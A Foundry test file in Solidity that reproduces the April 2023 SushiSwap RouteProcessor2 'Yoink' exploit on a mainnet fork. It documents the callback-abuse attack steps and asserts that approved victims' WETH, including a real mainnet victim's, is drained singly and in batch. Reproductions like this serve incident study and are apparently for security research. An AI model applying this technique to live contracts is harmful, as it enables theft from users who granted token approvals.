//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {SushiAttacker, IRouteProcessor2, IERC20} from "../../src/sushi-yoink2023/SushiYoink.sol";
import {ForkUtils} from "../utils/ForkUtils.t.sol";

/**
 * @notice SushiSwap RouteProcessor2 "Yoink" Exploit Test - April 2023
 * @dev Attack Steps:
 *      1. Attacker deploys malicious contract implementing UniswapV3Pool interface (swap, token0, token1, fee)
 *      2. Attacker creates malicious route payload encoding attacker contract as "pool" address
 *      3. Attacker calls router.processRoute() which calls attackerContract.swap()
 *      4. Attacker contract's swap() calls router.uniswapV3SwapCallback() with victim address in data
 *      5. Router's callback executes token.transferFrom(victim, attacker, amount) without pool validation
 *      6. Tokens drained from any victim who approved the RouteProcessor2 contract
 * @dev Example Transaction: https://etherscan.io/tx/0xea3480f1f1d1f0b32283f8f282ce16403fe22ede35c0b71a732193e56c5c45e8
 */
contract SushiYoink is Test, ForkUtils {
    // Contract addresses
    address constant ROUTER_ADDRESS = 0x044b75f554b886A065b9567891e45c79542d7357;
    address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 constant BLOCK_NUMBER = 17_007_838; // one block before the attack happened

    SushiAttacker public attacker;
    IERC20 public weth;
    address public realVictim;
    address public victim1;
    address public victim2;

    function setUp() public {
        // Setup fork at one block before attack happened
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        setupFork("sushi-yoink", rpcUrl, BLOCK_NUMBER);
        selectFork("sushi-yoink");

        console.log("Forked to block %s", BLOCK_NUMBER);
        console.log("chainId: %s", block.chainid);

        // Deploy attacker contract
        attacker = new SushiAttacker(ROUTER_ADDRESS);
        weth = IERC20(WETH_ADDRESS);

        console.log("Attacker deployed at:", address(attacker));

        // Initialize victims
        realVictim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1; // real mainnet victim at attack time
        victim1 = makeAddr("victim1");
        victim2 = makeAddr("victim2");

        // Setup victims with WETH and approvals
        _setupVictims(victim1, 100 ether);
        _setupVictims(victim2, 32 ether);
    }

    // Test demonstrates funds drained from real victim by exploiting callback vulnerability
    function testRealVictimExploit() public {
        uint256 realVictimBalanceBefore = weth.balanceOf(realVictim);
        uint256 attackerBalanceBefore = weth.balanceOf(address(attacker));

        attacker.exploit(WETH_ADDRESS, realVictim);

        uint256 realVictimBalanceAfter = weth.balanceOf(realVictim);
        assertEq(realVictimBalanceAfter, 0);
        assertEq(weth.balanceOf(address(attacker)), attackerBalanceBefore + realVictimBalanceBefore);
    }

    // Test demonstrates batch draining multiple victims in single transaction
    function testBatchExploit() public {
        address[] memory victims = new address[](3);
        victims[0] = realVictim;
        victims[1] = victim1;
        victims[2] = victim2;

        uint256 attackerBalanceBefore = weth.balanceOf(address(attacker));
        uint256 realVictimBalanceBefore = weth.balanceOf(realVictim);
        uint256 victim1BalanceBefore = weth.balanceOf(victim1);
        uint256 victim2BalanceBefore = weth.balanceOf(victim2);

        attacker.batchExploit(WETH_ADDRESS, victims);

        uint256 attackerBalanceAfter = weth.balanceOf(address(attacker));
        uint256 realVictimBalanceAfter = weth.balanceOf(realVictim);
        uint256 victim1BalanceAfter = weth.balanceOf(victim1);
        uint256 victim2BalanceAfter = weth.balanceOf(victim2);

        assertEq(
            attackerBalanceAfter,
            attackerBalanceBefore + realVictimBalanceBefore + victim1BalanceBefore + victim2BalanceBefore
        );
        assertEq(realVictimBalanceAfter, 0);
        assertEq(victim1BalanceAfter, 0);
        assertEq(victim2BalanceAfter, 0);
    }

    // Helper function to setup victims with WETH and approvals
    function _setupVictims(address victimAddress, uint256 Amount) internal {
        deal(address(weth), victimAddress, Amount);
        vm.prank(victimAddress);
        weth.approve(ROUTER_ADDRESS, type(uint256).max);

        console.log("\nVictim setup:", victimAddress);
        console.log("Balance:", weth.balanceOf(victimAddress) / 1e18, "WETH");
        console.log("Approved:", weth.allowance(victimAddress, ROUTER_ADDRESS));
    }
}
